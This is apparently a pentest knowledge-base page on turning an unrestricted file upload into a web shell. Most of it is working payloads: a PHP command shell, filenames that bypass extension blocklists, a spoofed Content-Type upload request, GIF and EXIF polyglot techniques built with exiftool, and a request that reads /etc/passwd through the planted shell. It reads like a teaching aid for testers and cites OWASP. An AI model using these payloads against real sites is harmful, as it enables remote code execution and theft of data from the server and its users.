---
title: "Unrestricted upload: planting a web shell"
order: 2
description: "Defeating extension, Content-Type, and magic-byte checks to store an executable script in a web-served path, then requesting it for remote code execution."
keywords:
  - unrestricted file upload
  - web shell
  - double extension
  - content-type spoofing
  - magic bytes
  - polyglot
---

# Unrestricted upload

An upload endpoint that does not firmly control the stored file's extension, content, and location lets an attacker write an executable script into a directory the web server interprets. Requesting that file then runs attacker code in the service account's context.

## The minimal payload

A one-line PHP shell is enough to turn a stored file into a command endpoint:

```php
<?php system($_GET['c']); ?>
```

Once stored at a served path, execution is a single request:

```
GET /uploads/shell.php?c=id HTTP/1.1
```

## Defeating extension checks

Validation that inspects the filename is brittle. Each of these targets a different weak check.

**Double extension.** A server that routes on the first dot, or an Apache with a permissive `AddHandler`, executes the PHP while the check only sees `.jpg`:

```
shell.php.jpg
shell.phtml.jpg
```

**Alternate executable extensions.** Blocklists often miss the less common handlers that still execute:

```
shell.phtml
shell.php5
shell.phar
shell.pht
```

**Case variation.** A case-sensitive blocklist that bans `.php` misses mixed case on a case-insensitive filesystem or handler:

```
shell.pHp
shell.PHP
```

**Trailing dot or space.** Windows and some parsers strip a trailing dot or space after the check runs, leaving `shell.php` on disk:

```
shell.php.
shell.php%20
shell.asp::$DATA
```

**Null byte (legacy stacks).** Against old PHP (before 5.3.4) or C-based handlers, a null truncates the stored name so everything after it is dropped:

```
shell.php%00.jpg
```

## Content-Type spoofing

When the server trusts the multipart `Content-Type` header, set it to an allowed type while the body stays a script:

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--X--
```

## Magic bytes and polyglots

Checks that sniff the first bytes of the content are beaten by prefixing a valid signature. `GIF89a` is a plain-text image header, so the file passes an `image/gif` sniff yet is still valid PHP:

```php
GIF89a
<?php system($_GET['c']); ?>
```

Give it a double extension if the content check and the extension check are both present:

```
shell.gif.php
```

A true polyglot survives stricter parsers and image libraries. Embed PHP in the EXIF comment of a real JPEG, then have the application include it:

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg -o shell.jpg
mv shell.jpg shell.php
```

## From storage to execution

The write is only half the attack. The stored file must sit under a path the interpreter handles, and you must learn its URL:

- Watch the upload response for the returned path or filename.
- Infer the directory from how existing files are served (an avatar at `/uploads/42.png` implies `/uploads/`).
- When names are randomized, abuse a second feature (listing, predictable timestamps) to recover them.

If the upload lands outside the web root, pair it with a local file inclusion sink to execute it, or use an archive extraction flaw to relocate it. Once the URL is known, request it with your command parameter:

```
GET /uploads/shell.gif.php?c=cat%20/etc/passwd HTTP/1.1
```

For non-PHP stacks, swap the payload: a `.jsp`, `.aspx`, or `.jspx` shell on Java/.NET, or a `.svg` with an embedded script for stored XSS when execution is not reachable.

## Tools

- **[Burp Suite](https://portswigger.net/burp)**: Intruder for fuzzing extensions, Content-Type, and magic bytes.
- **[exiftool](https://exiftool.org/)**: embed payloads in image metadata to build polyglots.

## References

- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Web Security Testing Guide: Testing Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
